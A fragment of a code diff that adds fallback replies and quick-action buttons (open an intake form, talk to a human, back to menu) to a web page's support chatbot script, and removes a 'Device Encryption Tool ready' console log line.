+        "I couldn't forward that automatically right now. Please submit the intake form, " +
+        'or email us directly at ' + RECIPIENT_EMAIL + '.'
+      );
+      setQuick([{ label: 'Open the form', action: goToForm }]);
+    });
+    return;
+  }
 
-    console.log('Device Encryption Tool ready.');
-  </script>
+  /* ---- generic fallback ---- */
+  botSay('Thanks for sharing that. The fastest way to get help is the confidential intake form — our analysts review every submission.', 750);
+  setQuick([
+    { label: 'Open the form', action: goToForm },
+    { label: 'Talk to a human', action: askHuman },
+    { label: 'Back to menu', action: menu }
+  ]);
+});
+</script>
+
 </body>
 </html>
